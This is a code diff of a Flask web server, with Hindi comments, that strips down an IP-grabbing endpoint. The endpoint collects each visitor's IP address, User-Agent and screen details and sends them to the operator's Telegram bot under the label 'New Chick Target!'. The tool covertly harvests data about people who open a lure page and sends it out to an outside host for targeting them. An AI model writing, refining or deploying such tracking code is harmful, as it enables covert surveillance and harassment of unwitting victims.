@@ -1,39 +1,23 @@
-from flask import Flask, request, jsonify, send_from_directory
+from flask import Flask, request, jsonify
 import requests
-from user_agents import parse
 import os, base64, time
-from pathlib import Path
-
-# Root path fix
-BASE_DIR = Path(__file__).resolve().parent.parent
 
 app = Flask(__name__)
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YAHAN_APNA_TOKEN_DALO")
 MY_CHAT_ID = os.environ.get("MY_CHAT_ID", "YAHAN_APNI_CHAT_ID_DALO")
 
-@app.route('/')
-def home():
-    return send_from_directory(str(BASE_DIR), 'index.html')
-
 @app.route('/log_ip', methods=['POST'])
 def log_ip():
     data = request.json
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-    ua_string = request.headers.get('User-Agent', 'Unknown')
-    user_agent = parse(ua_string)
     
-    device_name = user_agent.device.family
-    if device_name == 'Other':
-        device_name = user_agent.os.family
-        
-    browser_name = user_agent.browser.family
+    # Bina kisi extra library ke user agent nikal rahe hain
+    user_agent = request.headers.get('User-Agent', 'Unknown')
     
     msg = (f"<b>🎯 New Chick Target!</b>\n\n"
            f"<b>IP Address:</b> <code>{ip}</code>\n"
-           f"<b>Device:</b> {device_name}\n"
-           f"<b>OS:</b> {user_agent.os.family} {user_agent.os.version_string}\n"
-           f"<b>Browser:</b> {browser_name}\n"
+           f"<b>Device Info:</b> {user_agent}\n"
            f"<b>Screen:</b> {data.get('screen')}")
     
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
